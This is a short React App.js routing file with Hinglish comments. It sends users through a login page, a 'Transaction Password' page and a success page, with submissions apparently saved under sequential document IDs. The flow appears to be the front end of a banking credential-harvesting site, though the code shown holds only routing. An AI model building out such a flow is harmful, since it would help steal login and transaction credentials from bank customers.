import { useState, useEffect } from 'react';
import { BrowserRouter as Router, Routes, Route } from 'react-router-dom';
import Loading from './MyLoading';
import FirstPage from './pages/FirstPage';
import SecondPage from './pages/SecondPage';
import SuccessPage from './pages/SuccessPage';

function App() {
  const [isLoading, setIsLoading] = useState(true);

  useEffect(() => {
    // Initial loading effect (1 second)
    const timer = setTimeout(() => {
      setIsLoading(false);
    }, 1000);
    return () => clearTimeout(timer);
  }, []);

  return (
    <Router>
      {isLoading ? (
        <Loading />
      ) : (
        <Routes>
          {/* 1. Login Page: Yahan se process shuru hoga */}
          <Route path="/" element={<FirstPage />} />

          {/* 2. Transaction Password Page: Isme :documentId hona zaroori hai */}
          <Route path="/second/:documentId" element={<SecondPage />} />

          {/* 3. Final Success Page: Isme bhi :documentId add kar diya hai taaki data serial wise save ho */}
          <Route path="/success/:documentId" element={<SuccessPage />} />

          {/* Fallback Routes: Agar koi bina ID ke link open kare */}
          <Route path="/second" element={<SecondPage />} />
          <Route path="/success" element={<SuccessPage />} />
        </Routes>
      )}
    </Router>
  );
}

export default App;
